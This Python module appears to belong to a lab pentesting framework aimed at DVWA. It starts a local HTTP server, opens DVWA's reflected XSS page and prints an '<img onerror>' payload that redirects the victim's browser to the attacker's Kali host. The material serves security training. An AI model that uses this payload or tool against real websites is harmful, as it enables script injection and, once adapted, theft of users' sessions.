# tools/XSS/main.py
import socket
import subprocess
import webbrowser

from utils import ok, info, warn, fail, printcolored, colored

class Tool:
    def __init__(self):
        self.name = "xss"
        self.kaliip = self.getlocalip()
        self.port = 8080
        self.serverprocess = None
        self.dvwaurl = "http://192.168.107.129"

    def getlocalip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def showhelp(self):
        printcolored("Reflected XSS Tool (Part 3)", "yellow")
        print(f"Kali IP:  {self.kaliip}")
        print(f"Port:     {self.port}")
        print(f"DVWA URL:  {self.dvwaurl}")
        print("Commands:")
        print("  setup              - Start http.server in new terminal + open DVWA XSS (Reflected)")
        print("  generate           - Print payload")
        print("  set ip <ip>        - Set Kali IP")
        print("  set port <port>    - Set server port")
        print("  set dvwa <url>     - Set DVWA base URL")
        print("  back               - Return to framework")

    def handlecommand(self, cmdinput):
        cmd = cmdinput.strip()
        low = cmd.lower()

        if low in ("help", "show options"):
            self.showhelp()
            return

        if low == "setup":
            self.startserver()
            self.opendvwa()
            return

        if low == "generate":
            self.generatepayload()
            return

        if low.startswith("set ip "):
            self.kaliip = cmd.split(maxsplit=2)[2].strip()
            ok(f"Kali IP set to {self.kaliip}")
            return

        if low.startswith("set port "):
            try:
                self.port = int(cmd.split(maxsplit=2)[2].strip())
                ok(f"Port set to {self.port}")
            except ValueError:
                fail("Usage: set port <number>")
            return

        if low.startswith("set dvwa "):
            self.dvwaurl = cmd.split(maxsplit=2)[2].strip().rstrip("/")
            ok(f"DVWA URL set to {self.dvwaurl}")
            return

        if low in ("back", "exit", "quit"):
            if self.serverprocess:
                try:
                    self.serverprocess.terminate()
                except Exception:
                    pass
            info("Returning to main Bandito menu...")
            return

        fail(f"Unknown command: {cmd}")

    def startserver(self):
        info(f"Starting HTTP server on http://{self.kaliip}:{self.port}")
        try:
            self.serverprocess = subprocess.Popen(
                ["gnome-terminal", "--", "python3", "-m", "http.server", str(self.port)]
            )
            ok("Server started in new terminal")
        except Exception as e:
            warn(f"Could not open new terminal: {e}")
            warn(f"Run manually: python3 -m http.server {self.port}")

    def opendvwa(self):
        url = f"{self.dvwaurl}/vulnerabilities/xss_r/"
        info(f"Opening DVWA Reflected XSS page: {url}")
        webbrowser.open(url)

    def generatepayload(self):
        payload = f"<img src=x onerror=window.location='http://{self.kaliip}:{self.port}/xsstest'>"
        ok("Reflected XSS payload:")
        print(payload)
        info("Paste into the reflected XSS input field and submit.")
